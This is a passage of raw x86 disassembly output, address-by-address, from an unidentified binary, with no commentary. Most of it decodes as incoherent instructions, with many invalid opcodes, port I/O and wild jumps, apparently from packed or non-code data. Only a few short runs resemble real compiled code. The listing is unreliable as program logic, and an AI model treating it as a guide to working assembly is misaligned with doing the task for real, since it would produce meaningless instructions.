  40c8c1:	bound  eax,QWORD PTR ds:0xbb547f6
  40c8c7:	or     DWORD PTR [edx],esp
  40c8c9:	cmc    
  40c8ca:	xchg   esi,eax
  40c8cb:	(bad)  
  40c8cc:	pop    ecx
  40c8cd:	mov    ebp,0x47f49f2f
  40c8d2:	fimul  WORD PTR [edi]
  40c8d4:	ins    DWORD PTR es:[edi],dx
  40c8d5:	pop    es
  40c8d6:	or     al,0x5b
  40c8d8:	data16 fdivp st(2),st
  40c8db:	pop    edi
  40c8dc:	fiadd  DWORD PTR [edx+0x28]
  40c8df:	in     al,dx
  40c8e0:	jno    0x40c93b
  40c8e2:	in     al,dx
  40c8e3:	mov    dl,0x14
  40c8e5:	mov    ebp,0x52f2c0d8
  40c8ea:	outs   dx,BYTE PTR ds:[esi]
  40c8eb:	enter  0x9e18,0xb0
  40c8ef:	mov    DWORD PTR [edi-0x50822431],0xecfec02d
  40c8f9:	jl     0x40c8df
  40c8fb:	and    esi,esi
  40c8fd:	sar    ch,1
  40c8ff:	pusha  
  40c900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c901:	pop    edi
  40c902:	mov    eax,ss:0x5fa22aa6
  40c908:	pop    eax
  40c909:	daa    
  40c90a:	mov    bh,0x8d
  40c90c:	jnp    0x40c8ba
  40c90e:	dec    ecx
  40c90f:	pop    ecx
  40c910:	xchg   ebx,eax
  40c911:	xchg   edx,eax
  40c912:	aad    0x26
  40c914:	pop    esp
  40c915:	push   ds
  40c916:	std    
  40c917:	push   ecx
  40c918:	cld    
  40c919:	shr    edi,0x8b
  40c91c:	sub    esi,ebx
  40c91e:	mov    eax,ds:0x4d93e177
  40c923:	lds    esp,FWORD PTR [edx+0x4d8b10a5]
  40c929:	in     al,dx
  40c92a:	mov    cl,BYTE PTR [eax+ecx*1]
  40c92d:	mov    eax,DWORD PTR [ebp-0x34]
  40c930:	or     BYTE PTR [eax],cl
  40c932:	mov    eax,DWORD PTR [ebp+0x10]
  40c935:	mov    ecx,eax
  40c937:	jmp    0x40cec1
  40c93c:	and    DWORD PTR [edx],ebp
  40c93e:	sbb    cl,BYTE PTR ds:0x1a21fd20
  40c944:	in     al,dx
  40c945:	and    al,0xf9
  40c947:	push   0xa81e96e9
  40c94c:	jae    0x40c918
  40c94e:	push   ss
  40c94f:	push   ss
  40c950:	cmp    eax,0x90161604
  40c955:	shl    ch,cl
  40c957:	pop    ds
  40c958:	push   eax
  40c959:	stos   BYTE PTR es:[edi],al
  40c95a:	mov    ds,WORD PTR [ecx]
  40c95c:	in     eax,0xfe
  40c95e:	lahf   
  40c95f:	push   esi
  40c960:	mov    edx,0x599d7891
  40c965:	and    al,0x7b
  40c967:	sbb    al,0x56
  40c969:	repz (bad) 
  40c96b:	sti    
  40c96c:	outs   dx,BYTE PTR ds:[esi]
  40c96d:	aaa    
  40c96e:	mov    esp,0x728461a3
  40c973:	pop    esp
  40c974:	lea    edi,[esi-0x62]
  40c977:	jge    0x40c9f5
  40c979:	lea    eax,[ebx]
  40c97b:	jmp    0x4ab816a5
  40c980:	hlt    
  40c981:	idiv   al
  40c983:	lods   eax,DWORD PTR ds:[esi]
  40c984:	jecxz  0x40c950
  40c986:	ins    DWORD PTR es:[edi],dx
  40c987:	or     cl,BYTE PTR [esi+0x47]
  40c98a:	nop
  40c98b:	sahf   
  40c98c:	jno    0x40c913
  40c98e:	adc    al,0x5c
  40c990:	add    DWORD PTR [esi],ebp
  40c992:	mov    bl,0x8a
  40c994:	repnz mov ch,0xd
  40c997:	dec    ebp
  40c998:	push   edi
  40c999:	rep outs dx,DWORD PTR ds:[esi]
  40c99b:	in     al,0xc6
  40c99d:	fnsave [ebp-0x4358cab2]
  40c9a3:	jmp    0x40c9d4
  40c9a5:	mov    ebp,edx
  40c9a7:	push   0x9207118d
  40c9ac:	xchg   ebx,eax
  40c9ad:	mov    cl,0xcd
  40c9af:	int    0xa1
  40c9b1:	inc    ecx
  40c9b2:	jecxz  0x40c94d
  40c9b4:	and    dh,BYTE PTR [edx-0x61]
  40c9b7:	or     DWORD PTR [ebx],edx
  40c9b9:	mov    dl,dl
  40c9bb:	xchg   esi,eax
  40c9bc:	les    esi,FWORD PTR [ecx+0x6]
  40c9bf:	add    BYTE PTR [ecx],dh
  40c9c1:	jge    0x40ca15
  40c9c3:	mov    ah,BYTE PTR [ebx+0x124d42]
  40c9c9:	fbstp  TBYTE PTR [edi]
  40c9cb:	sbb    eax,0x16717b4a
  40c9d0:	gs int3 
  40c9d2:	mov    ebx,0x5fcf34e5
  40c9d7:	gs retf 
  40c9d9:	cmp    si,WORD PTR [eax+0x54fdbaba]
  40c9e0:	les    eax,FWORD PTR [eax+0x7]
  40c9e3:	xchg   ecx,eax
  40c9e4:	test   al,0xcd
  40c9e6:	repnz out 0x3e,al
  40c9e9:	in     al,0xd6
  40c9eb:	xchg   ecx,eax
  40c9ec:	sbb    BYTE PTR [ecx+eiz*8+0x4b],dh
  40c9f0:	sbb    al,0xe
  40c9f2:	jbe    0x40ca3d
  40c9f4:	fcomp  DWORD PTR [eax-0x7e]
  40c9f7:	mov    ch,0x2b
  40c9f9:	xchg   ecx,eax
  40c9fa:	cmp    DWORD PTR [edx+0x3d7c4b87],0xffffff97
  40ca01:	leave  
  40ca02:	mov    esp,0xcb0cbf28
  40ca07:	dec    eax
  40ca08:	jo     0x40ca5a
  40ca0a:	jae    0x40c994
  40ca0c:	push   edx
  40ca0d:	(bad)  
  40ca0f:	adc    BYTE PTR [eax],bl
  40ca11:	sub    DWORD PTR [ebx],0xd790a9e2
  40ca17:	push   ecx
  40ca18:	idiv   BYTE PTR [di-0x790a]
  40ca1d:	xchg   DWORD PTR [eax+0x37ce0512],edx
  40ca23:	xchg   ebp,esi
  40ca25:	mov    ebp,0x878423c9
  40ca2a:	pop    ss
  40ca2b:	jl     0x40ca26
  40ca2d:	push   es
  40ca2e:	sub    dl,BYTE PTR [esi-0x4ba2f769]
  40ca34:	mov    ebp,DWORD PTR [ebx]
  40ca36:	and    dh,BYTE PTR [ecx-0x55]
  40ca39:	xchg   edx,eax
  40ca3a:	test   DWORD PTR [edi-0x50da6c7e],edi
  40ca40:	mov    bl,0x46
  40ca42:	(bad)  
  40ca43:	ror    BYTE PTR [edi-0x3f2cfd7f],cl
  40ca49:	xchg   ecx,eax
  40ca4a:	fcomp  DWORD PTR [esi+0x45f8c88c]
  40ca50:	cmp    eax,DWORD PTR [esi-0x516213e5]
  40ca56:	inc    eax
  40ca57:	dec    edi
  40ca58:	in     eax,dx
  40ca59:	pop    ss
  40ca5a:	mov    ebx,0xbc33c673
  40ca5f:	je     0x40cac3
  40ca61:	into   
  40ca62:	fwait
  40ca63:	mov    ds:0x9cb64430,eax
  40ca68:	loope  0x40cac6
  40ca6a:	push   eax
  40ca6b:	pop    es
  40ca6c:	and    edi,DWORD PTR [edi]
  40ca6e:	(bad)  
  40ca6f:	mov    edx,0x7f05f540
  40ca74:	cs add dl,bl
  40ca77:	adc    esp,ecx
  40ca79:	cmp    DWORD PTR [edi],esi
  40ca7b:	push   eax
  40ca7c:	xor    al,0xaf
  40ca7e:	or     eax,DWORD PTR es:[ebp-0x41]
  40ca82:	lods   eax,DWORD PTR ds:[esi]
  40ca83:	leave  
  40ca84:	inc    ebp
  40ca85:	pop    esp
  40ca86:	mov    ecx,0x2ad87fd1
  40ca8b:	fidivr DWORD PTR ds:0xe4a0d262
  40ca91:	sbb    al,0x2
  40ca93:	push   ss
  40ca94:	inc    ebp
  40ca95:	xchg   edx,eax
  40ca96:	mov    al,ds:0xa41d12ee
  40ca9b:	mov    edi,0xf3161e2c
  40caa0:	into   
  40caa1:	sbb    ah,BYTE PTR [esi+esi*8+0x5]
  40caa5:	xchg   ebp,eax
  40caa6:	mov    ah,ch
  40caa8:	lods   al,BYTE PTR ds:[esi]
  40caa9:	push   ebp
  40caaa:	stc    
  40caab:	mov    eax,DWORD PTR [ecx]
  40caad:	test   DWORD PTR ss:[ebx],0x8dec50b6
  40cab4:	add    ah,BYTE PTR [edx+0x4705ba8e]
  40caba:	xchg   ebx,eax
  40cabb:	cwde   
  40cabc:	xchg   ch,ah
  40cabe:	loope  0x40cab6
  40cac0:	push   cs
  40cac1:	or     al,0xb9
  40cac3:	test   al,0x99
  40cac5:	test   al,0x50
  40cac7:	cmp    DWORD PTR [ebp+0x47],ebp
  40caca:	pop    DWORD PTR [ebp+edi*4+0x3b]
  40cace:	call   0x537c76db
  40cad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad4:	cld    
  40cad5:	add    BYTE PTR [edi+0x70effd4],bh
  40cadb:	cwde   
  40cadc:	dec    edx
  40cadd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cade:	outs   dx,DWORD PTR ds:[esi]
  40cadf:	mov    BYTE PTR [edi+0x32bea1e4],bh
  40cae5:	inc    ebx
  40cae6:	leave  
  40cae7:	lea    ecx,[eax-0x369e9327]
  40caed:	bound  edi,QWORD PTR ds:0x1f4946a2
  40caf3:	pop    ebp
  40caf4:	scas   al,BYTE PTR es:[edi]
  40caf5:	push   edi
  40caf6:	inc    BYTE PTR [ecx+0x5a]
  40caf9:	js     0x40cab2
  40cafb:	shr    DWORD PTR [ecx],cl
  40cafd:	push   0x2c
  40caff:	repz add ecx,DWORD PTR [eax-0xafeaa57]
  40cb06:	xor    DWORD PTR [ebx+0x24],edi
  40cb09:	das    
  40cb0a:	mov    al,0xa6
  40cb0c:	in     al,0x1c
  40cb0e:	pop    es
  40cb0f:	adc    ebp,edx
  40cb11:	add    DWORD PTR [esi-0x33],ecx
  40cb14:	mov    dl,0x88
  40cb16:	inc    ebx
  40cb17:	(bad)  
  40cb18:	js     0x40caa0
  40cb1a:	addr16 mov ebp,0x543f12fb
  40cb20:	ss ret 
  40cb22:	fsubrp st(7),st
  40cb24:	mov    cl,0x81
  40cb26:	dec    ebx
  40cb27:	pop    edx
  40cb28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb29:	int    0x32
  40cb2b:	mov    ebx,0x4050f5a
  40cb30:	push   edx
  40cb31:	nop
  40cb32:	(bad)  
  40cb33:	dec    edx
  40cb34:	test   al,0xe8
  40cb36:	jge    0x40cb85
  40cb38:	mov    edi,0xfd872134
  40cb3d:	lahf   
  40cb3e:	enter  0x1e23,0x5b
  40cb42:	inc    ecx
  40cb43:	dec    ebp
  40cb44:	xchg   esi,eax
  40cb45:	and    ecx,DWORD PTR [ecx+0x42f2be4b]
  40cb4b:	je     0x40cb13
  40cb4d:	mov    bh,0x3c
  40cb4f:	mov    al,0xe3
  40cb51:	or     DWORD PTR [ecx-0x4f],ecx
  40cb54:	in     al,0xa0
  40cb56:	jg     0x40cbb0
  40cb58:	add    edi,DWORD PTR [ecx+0x7a]
  40cb5b:	lds    edi,FWORD PTR [ebx-0x4ab67df6]
  40cb61:	fnstcw WORD PTR ds:[eax-0x54]
  40cb65:	mov    esp,0xad06aa12
  40cb6a:	push   esi
  40cb6b:	mov    al,0x48
  40cb6d:	add    ch,BYTE PTR [ecx+0x7f]
  40cb70:	dec    ebx
  40cb71:	ins    BYTE PTR es:[edi],dx
  40cb72:	(bad)  
  40cb73:	das    
  40cb74:	es aam 0x5b
  40cb77:	push   ebx
  40cb78:	retf   0xab24
  40cb7b:	or     ebx,eax
  40cb7d:	cmp    cl,cl
  40cb7f:	lock stos BYTE PTR es:[edi],al
  40cb81:	dec    ebp
  40cb82:	test   DWORD PTR [ecx+0x31],0x4d68fbca
  40cb89:	aas    
  40cb8a:	in     eax,dx
  40cb8b:	in     al,0x15
  40cb8d:	leavew 
  40cb8f:	in     eax,dx
  40cb90:	xlat   BYTE PTR ds:[ebx]
  40cb91:	or     DWORD PTR [eax+esi*4],0x45
  40cb95:	inc    eax
  40cb96:	lods   eax,DWORD PTR ds:[esi]
  40cb97:	sahf   
  40cb98:	fmul   DWORD PTR [ecx-0x4c]
  40cb9b:	lahf   
  40cb9c:	daa    
  40cb9d:	fild   QWORD PTR ds:0xf1b51b48
  40cba3:	xchg   BYTE PTR [eax+0x64],bl
  40cba6:	imul   ebp,eax,0x18235137
  40cbac:	std    
  40cbad:	aaa    
  40cbae:	jecxz  0x40cc12
  40cbb0:	(bad)  
  40cbb1:	imul   edi,DWORD PTR ds:0xf6a7663b,0xffffffda
  40cbb8:	ror    DWORD PTR ds:0xc5bb4ac9,0x66
  40cbbf:	jmp    0xd0c4586b
  40cbc4:	shl    cl,0xbf
  40cbc7:	in     al,dx
  40cbc8:	mov    ebx,gs
  40cbca:	xor    edx,DWORD PTR [eax+ecx*4]
  40cbcd:	or     DWORD PTR [ecx+esi*2+0x6b],edi
  40cbd1:	xor    al,0xe4
  40cbd3:	xlat   BYTE PTR ds:[ebx]
  40cbd5:	jno    0x40cbcd
  40cbd7:	repz adc eax,0xf7144d20
  40cbdd:	ret    
  40cbde:	test   BYTE PTR [edi],0xe8
  40cbe1:	and    esp,DWORD PTR [ebx]
  40cbe3:	mov    edi,0xfde805f7
  40cbe8:	sub    ah,BYTE PTR [eax+0x6a]
  40cbeb:	mov    ds:0x6d7512cf,al
  40cbf0:	push   eax
  40cbf1:	jmpw   0xf557
  40cbf5:	sub    eax,0xd9f0b509
  40cbfa:	mov    gs,WORD PTR [ecx]
  40cbfc:	or     DWORD PTR [edi+0x38],eax
  40cbff:	std    
  40cc00:	test   eax,0x79d1c1
  40cc05:	rcr    DWORD PTR [ebx-0x64b6cdf3],1
  40cc0b:	scas   al,BYTE PTR es:[edi]
  40cc0c:	dec    DWORD PTR [eax+0x5a]
  40cc0f:	jg     0x40cc15
  40cc11:	xor    al,0x58
  40cc13:	ror    al,1
  40cc15:	into   
  40cc16:	shl    BYTE PTR cs:[ebx],1
  40cc19:	mov    dh,0xb9
  40cc1b:	(bad)  
  40cc1c:	shr    DWORD PTR [eax-0x7c],1
  40cc1f:	or     ebx,0xfffffff4
  40cc22:	adc    DWORD PTR [edx-0x69],ecx
  40cc25:	test   al,0x89
  40cc27:	sbb    DWORD PTR fs:[edi-0x4d78caf3],edi
  40cc2e:	(bad)  
  40cc2f:	and    dh,dl
  40cc31:	mov    ebx,0x54fd1d1
  40cc36:	or     DWORD PTR [esi+edi*8],ebp
  40cc39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc3a:	(bad)  
  40cc3b:	sti    
  40cc3c:	mov    ecx,0x37713b62
  40cc41:	ret    0x458d
  40cc44:	mov    edi,0x2797f174
  40cc49:	adc    eax,0x421710ce
  40cc4e:	jmp    0xb3f08fc8
  40cc53:	or     ecx,DWORD PTR [edx+0x44]
  40cc56:	or     DWORD PTR [esi],edi
  40cc58:	adc    al,0x6b
  40cc5a:	add    ah,cl
  40cc5c:	mov    ah,0x44
  40cc5e:	(bad)  
  40cc5f:	aam    0xd1
  40cc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc62:	lods   al,BYTE PTR ds:[esi]
  40cc63:	pop    ss
  40cc64:	pop    ebx
  40cc65:	mov    esi,0xd50d716
  40cc6b:	xchg   esp,eax
  40cc6c:	xor    ebx,ebx
  40cc6e:	mov    esi,0xef5640c4
  40cc73:	fnsave [eax-0x7686dac0]
  40cc79:	sbb    edx,DWORD PTR [ecx]
  40cc7b:	clc    
  40cc7c:	inc    ebp
  40cc7d:	ror    BYTE PTR [edi+0x5d],cl
  40cc80:	mov    esi,0x99f8ad33
  40cc85:	sub    DWORD PTR [esi],0xcb13a124
  40cc8b:	lock jo 0x40cc9e
  40cc8e:	ret    
  40cc8f:	loopne 0x40cc81
  40cc91:	xchg   edx,eax
  40cc92:	cmp    DWORD PTR [edi+0x5b],eax
  40cc95:	xor    eax,0x5a36b154
  40cc9a:	(bad)  
  40cc9b:	imul   eax,DWORD PTR [ebp-0x55],0xffffffa5
  40cc9f:	ss repnz call 0xaea1:0x560e5d2
  40cca8:	bound  edx,QWORD PTR [eax]
  40ccaa:	pop    eax
  40ccab:	gs in  al,dx
  40ccad:	popa   
  40ccae:	xchg   esp,eax
  40ccaf:	and    eax,DWORD PTR [ebx+0x9f047b5]
  40ccb5:	inc    ecx
  40ccb6:	rcl    BYTE PTR ss:[edi],cl
  40ccb9:	rcr    DWORD PTR [edi],1
  40ccbb:	xchg   ebx,eax
  40ccbc:	adc    BYTE PTR fs:[ecx-0x34e0fc21],cl
  40ccc3:	icebp  
  40ccc4:	pop    edi
  40ccc5:	jne    0x40ccf8
  40ccc7:	in     al,dx
  40ccc8:	gs scas eax,DWORD PTR es:[edi]
  40ccca:	arpl   WORD PTR [esp+ebp*8-0x1310f98d],sp
  40ccd1:	mov    dl,0x82
  40ccd3:	or     ebx,DWORD PTR ds:0xe1a253b1
  40ccd9:	push   edi
  40ccda:	(bad)  
  40ccdb:	(bad)  
  40ccdc:	pop    ebp
  40ccdd:	retf   0x601e
  40cce0:	and    DWORD PTR [eax+esi*4-0x13],0x832745bd
  40cce8:	mov    edi,0x99e4415d
  40cced:	test   al,0x8
  40ccef:	bound  esi,QWORD PTR [eax-0x6c]
  40ccf2:	mov    eax,0xaff402b7
  40ccf7:	addr16 xchg esi,eax
  40ccf9:	jecxz  0x40ccf7
  40ccfb:	and    ch,BYTE PTR [ecx+edi*4]
  40ccfe:	and    DWORD PTR [eax+0x7a730dfb],edx
  40cd04:	or     BYTE PTR [esi],dl
  40cd06:	push   es
  40cd07:	inc    ecx
  40cd08:	cs pop ds
  40cd0a:	pusha  
  40cd0b:	push   esp
  40cd0c:	test   dl,cl
  40cd0e:	adc    ebp,DWORD PTR [ecx-0x35a90006]
  40cd14:	arpl   WORD PTR [edx-0x6160b547],di
  40cd1a:	push   edi
  40cd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd1c:	shr    cl,0xa
  40cd1f:	mov    edi,0x150a172e
  40cd24:	fadd   DWORD PTR [ebx+0x2d]
  40cd27:	(bad)  
  40cd28:	dec    edi
  40cd29:	lods   eax,DWORD PTR ds:[esi]
  40cd2a:	mov    ah,0xba
  40cd2c:	loopne 0x40ccef
  40cd2e:	aaa    
  40cd2f:	retf   
  40cd30:	loopne 0x40cd55
  40cd32:	and    cl,ch
  40cd34:	ja     0x40cdb4
  40cd36:	mov    ah,0xbc
  40cd38:	fnstenv [edx]
  40cd3a:	pop    esp
  40cd3b:	xor    edi,0x19
  40cd3e:	inc    ecx
  40cd3f:	mov    cl,0x96
  40cd41:	lahf   
  40cd42:	inc    ebp
  40cd43:	pop    edi
  40cd44:	jge    0x40cceb
  40cd46:	test   al,0x26
  40cd48:	xor    ah,BYTE PTR [ecx-0x7e]
  40cd4b:	fidiv  DWORD PTR [ebp-0x628879ba]
  40cd51:	arpl   WORD PTR ds:0x9bd41bfd,di
  40cd57:	fmul   QWORD PTR [ebp+0x4638d7c7]
  40cd5d:	rcr    ebx,1
  40cd5f:	out    dx,al
  40cd60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd62:	inc    eax
  40cd63:	xchg   ebp,eax
  40cd64:	fimul  DWORD PTR [edx]
  40cd66:	adc    edi,edi
  40cd68:	ss inc ecx
  40cd6a:	push   esi
  40cd6b:	push   ecx
  40cd6c:	ins    DWORD PTR es:[edi],dx
  40cd6d:	and    al,0x5e
  40cd6f:	fistp  QWORD PTR [esi-0x20adfc83]
  40cd75:	and    eax,0x3c197f2e
  40cd7a:	outs   dx,DWORD PTR ds:[esi]
  40cd7b:	mov    ebx,0x8a2e0590
  40cd80:	push   0xffffff83
  40cd82:	outs   dx,DWORD PTR ds:[esi]
  40cd83:	call   0x358b:0x3e7ed4df
  40cd8a:	push   esp
  40cd8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd8c:	or     al,dl
  40cd8e:	mov    esi,0xbc51644d
  40cd93:	into   
  40cd94:	lods   al,BYTE PTR ds:[esi]
  40cd95:	or     ch,BYTE PTR [eax+0x16]
  40cd98:	xlat   BYTE PTR ds:[ebx]
  40cd99:	dec    edx
  40cd9a:	fst    QWORD PTR [ebx+0x215887ba]
  40cda0:	sub    al,0x3
  40cda2:	jae    0x40cdc5
  40cda4:	in     eax,0xb5
  40cda6:	jmp    DWORD PTR [edi-0x79]
  40cda9:	nop
  40cdaa:	and    eax,0x3e033bde
  40cdaf:	push   es
  40cdb0:	scas   al,BYTE PTR es:[edi]
  40cdb1:	ins    DWORD PTR es:[edi],dx
  40cdb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdb3:	int    0x30
  40cdb5:	(bad)  
  40cdb6:	jo     0x40cdc8
  40cdb8:	loope  0x40cdc1
  40cdba:	mov    dh,0x38
  40cdbc:	push   0xa2331b
  40cdc1:	stos   DWORD PTR es:[edi],eax
  40cdc2:	aas    
  40cdc3:	out    dx,eax
  40cdc4:	icebp  
  40cdc5:	sub    al,0x2
  40cdc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdc8:	ficomp WORD PTR [ebx+0x4f]
  40cdcb:	pop    ecx
  40cdcc:	shl    DWORD PTR ds:0xe8f3542f,1
  40cdd2:	fs aad 0x49
  40cdd5:	fmul   QWORD PTR [ecx]
  40cdd7:	lds    ebp,FWORD PTR [esi]
  40cdd9:	not    DWORD PTR ds:0x54877755
  40cddf:	and    DWORD PTR [ebp-0x110382e2],0x47
  40cde6:	mov    eax,ds:0xcfe8ff03
  40cdeb:	adc    BYTE PTR [eax-0x31],ch
  40cdee:	sbb    bl,BYTE PTR [esi+edi*1]
  40cdf1:	lahf   
  40cdf2:	pop    es
  40cdf3:	sbb    DWORD PTR [edi+0x59],eax
  40cdf6:	mov    ?,WORD PTR [esi]
  40cdf8:	adc    ebp,DWORD PTR [edx-0x6e]
  40cdfb:	xchg   edx,eax
  40cdfc:	dec    DWORD PTR [edi-0x51]
  40cdff:	jl     0x40ce11
  40ce01:	popf   
  40ce02:	loop   0x40cdc3
  40ce04:	jp     0x40ce81
  40ce06:	cli    
  40ce07:	call   0x65639141
  40ce0c:	add    BYTE PTR [edi],0xf9
  40ce0f:	jns    0x40ce14
  40ce11:	out    0xc4,al
  40ce13:	retf   0x7335
  40ce16:	pop    es
  40ce17:	add    eax,0x45784770
  40ce1c:	push   ss
  40ce1d:	jns    0x40cdb8
  40ce1f:	cmc    
  40ce20:	add    eax,0xa09668ba
  40ce25:	loope  0x40cdef
  40ce27:	retf   
  40ce28:	jmp    0x3a949f8
  40ce2d:	xchg   ecx,eax
  40ce2e:	sti    
  40ce2f:	sub    bh,BYTE PTR [edi+0x64]
  40ce32:	cmp    edx,DWORD PTR [eax+eiz*1+0x2d]
  40ce36:	xchg   ebx,eax
  40ce37:	add    al,0xe0
  40ce39:	ret    0xcd61
  40ce3c:	xor    al,0x57
  40ce3e:	inc    edx
  40ce3f:	xor    bl,BYTE PTR ds:0x77383aa4
  40ce45:	mov    eax,ds:0xc42a7edf
  40ce4a:	xor    eax,DWORD PTR [ecx-0x58]
  40ce4d:	mov    al,0xcf
  40ce4f:	inc    esi
  40ce50:	sti    
  40ce51:	pop    edx
  40ce52:	adc    ecx,edi
  40ce54:	repz (bad) 
  40ce56:	in     al,dx
  40ce57:	cmp    al,0x5
  40ce5a:	pop    edi
  40ce5b:	fsubr  QWORD PTR [ebx+0x2c22c9bf]
  40ce61:	icebp  
  40ce62:	adc    DWORD PTR [edx+0x5e],esp
  40ce65:	add    DWORD PTR [ecx],esp
  40ce67:	pusha  
  40ce68:	out    0x89,eax
  40ce6a:	pusha  
  40ce6b:	sahf   
  40ce6c:	add    BYTE PTR [ebx+0x2e346db5],ch
  40ce72:	fbstp  TBYTE PTR [bx]
  40ce75:	call   0x91861d74
  40ce7a:	dec    ebx
  40ce7b:	xchg   BYTE PTR [esp+ebp*8+0x58cd9694],dh
  40ce82:	aam    0x37
  40ce84:	sbb    ah,BYTE PTR [eax]
  40ce86:	and    ch,dh
  40ce88:	sahf   
  40ce89:	mov    ebp,0x79707ac3
  40ce8e:	cmp    bh,ch
  40ce90:	push   ss
  40ce91:	sbb    ah,BYTE PTR [ecx-0x5438e9e4]
  40ce97:	inc    ecx
  40ce98:	xor    eax,0x7393e1bd
  40ce9d:	loop   0x40cebc
  40ce9f:	shl    BYTE PTR [esi-0x6d],cl
  40cea2:	jle    0x40ce84
  40cea4:	popf   
  40cea5:	push   edi
  40cea6:	dec    eax
  40cea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea8:	pop    ebx
  40cea9:	test   BYTE PTR [edi+0x37],dh
  40ceac:	addr16 mov eax,ds:0x471b
  40ceb0:	ret    0xf5d6
  40ceb3:	ins    DWORD PTR es:[edi],dx
  40ceb4:	outs   dx,DWORD PTR ds:[esi]
  40ceb5:	sbb    eax,0x43d9546
  40ceba:	fistp  WORD PTR [eax]
  40cebc:	fs jmp 0x40cf07
  40cebf:	sbb    esp,DWORD PTR [ecx]
  40cec1:	shrd   ecx,edx,0x2
  40cec5:	shl    eax,0x1e
  40cec8:	shr    edx,0x2
  40cecb:	mov    DWORD PTR [ebp+0x14],edx
  40cece:	mov    DWORD PTR [ebp+0x14],eax
  40ced1:	xor    edx,edx
  40ced3:	mov    eax,ecx
  40ced5:	xor    eax,edi
  40ced7:	or     eax,edx
  40ced9:	mov    edx,DWORD PTR [ebp-0x4]
  40cedc:	jmp    0x40d466
  40cee1:	lock jae 0x40cef2
  40cee4:	mov    ebp,0x13994155
  40cee9:	enter  0x8c7b,0x6e
  40ceed:	push   es
  40ceee:	mov    eax,ds:0xc8a8a8d2
  40cef3:	push   ss
  40cef4:	push   ss
  40cef5:	cmp    eax,0x98161604
  40cefa:	sub    edx,edx
  40cefc:	adc    eax,0xb0b05c72
  40cf01:	xor    ecx,edi
  40cf03:	sub    BYTE PTR [eax+0x1e3a09f6],ah
  40cf09:	js     0x40cf1e
  40cf0b:	jp     0x40ce98
  40cf0d:	and    ch,bh
  40cf0f:	and    al,0x2e
  40cf11:	jecxz  0x40cf6d
  40cf13:	fucomip st,st(1)
  40cf15:	test   BYTE PTR [ecx],cl
  40cf17:	cdq    
  40cf18:	mov    ebx,0x6ed9ad03
  40cf1d:	aam    0xa3
  40cf1f:	xor    ecx,edx
  40cf21:	aam    0x62
  40cf23:	mov    BYTE PTR [eax-0x57],dl
  40cf26:	jns    0x40ceac
  40cf28:	(bad)  
  40cf29:	fdiv   DWORD PTR [edi+0x1e]
  40cf2c:	gs ret 
  40cf2e:	aam    0xef
  40cf30:	test   DWORD PTR [ecx-0x3b],eax
  40cf33:	sbb    al,0x2a
  40cf35:	jg     0x40cf7c
  40cf37:	and    al,0x6
  40cf39:	jo     0x40cf24
  40cf3b:	les    eax,FWORD PTR [esi-0x1e7895ca]
  40cf41:	outs   dx,BYTE PTR ds:[esi]
  40cf42:	imul   ebx,DWORD PTR [edx-0x71],0x2dd9e043
  40cf49:	fwait
  40cf4a:	xchg   edi,eax
  40cf4b:	push   ds
  40cf4c:	scas   al,BYTE PTR es:[edi]
  40cf4d:	fadd   st,st(1)
  40cf4f:	xor    ch,BYTE PTR [edx+0x2c119b09]
  40cf55:	scas   eax,DWORD PTR es:[edi]
  40cf56:	rcr    BYTE PTR [ecx-0x15601524],cl
  40cf5c:	adc    bl,BYTE PTR [edx+0x44]
  40cf5f:	fs dec ecx
  40cf61:	cwde   
  40cf62:	jb     0x40cf57
  40cf64:	bound  esp,QWORD PTR [ecx+0xc]
  40cf67:	adc    BYTE PTR [eax-0x4a63388],bh
  40cf6d:	lea    eax,[ebx+0x447bd9ca]
  40cf73:	push   edx
  40cf74:	jns    0x40cfa7
  40cf76:	jbe    0x40cf18
  40cf78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf79:	cs jmp 0xdbd8:0x37f57914
  40cf81:	or     DWORD PTR [eax],eax
  40cf83:	in     eax,0xbf
  40cf85:	out    dx,al
  40cf86:	mov    ch,0xf
  40cf88:	mov    eax,0x52707090
  40cf8d:	xchg   edx,eax
  40cf8e:	xchg   ebp,eax
  40cf8f:	jl     0x40cf55
  40cf91:	retf   0x2197
  40cf94:	ret    0x1504
  40cf97:	jmp    0x15246ba6
  40cf9c:	lock fcmovnu st,st(1)
  40cf9f:	adc    eax,DWORD PTR [ebx-0x26]
  40cfa2:	ins    BYTE PTR es:[edi],dx
  40cfa3:	popa   
  40cfa4:	shl    DWORD PTR [eax-0x6484f685],1
  40cfaa:	pop    esi
  40cfab:	(bad)  
  40cfac:	nop
  40cfad:	js     0x40cffe
  40cfaf:	xor    eax,0xdb6eca19
  40cfb4:	aaa    
  40cfb5:	in     eax,dx
  40cfb6:	scas   al,BYTE PTR es:[edi]
  40cfb7:	fistp  DWORD PTR [ecx-0x3bdb966a]
  40cfbd:	sub    esi,esp
  40cfbf:	int3   
  40cfc0:	and    DWORD PTR ds:0x7340598,edx
  40cfc6:	mov    eax,0xc2fc5a43
  40cfcb:	in     eax,dx
  40cfcc:	loope  0x40cf5d
  40cfce:	dec    ebx
  40cfcf:	add    eax,ecx
  40cfd1:	aam    0xf5
  40cfd3:	(bad)  
  40cfd5:	dec    esp
  40cfd6:	jp     0x40cfbc
  40cfd8:	sar    DWORD PTR [ebp*4+0x184dcac4],0x6a
  40cfe0:	(bad)  
  40cfe1:	jo     0x40d042
  40cfe3:	push   ds
  40cfe4:	je     0x40d02f
  40cfe6:	ret    0x6870
  40cfe9:	ret    0x1195
  40cfec:	ret    
  40cfed:	or     al,0xe3
  40cfef:	mov    bl,cl
  40cff1:	sub    DWORD PTR [eax],ebp
  40cff3:	lods   al,BYTE PTR ds:[esi]
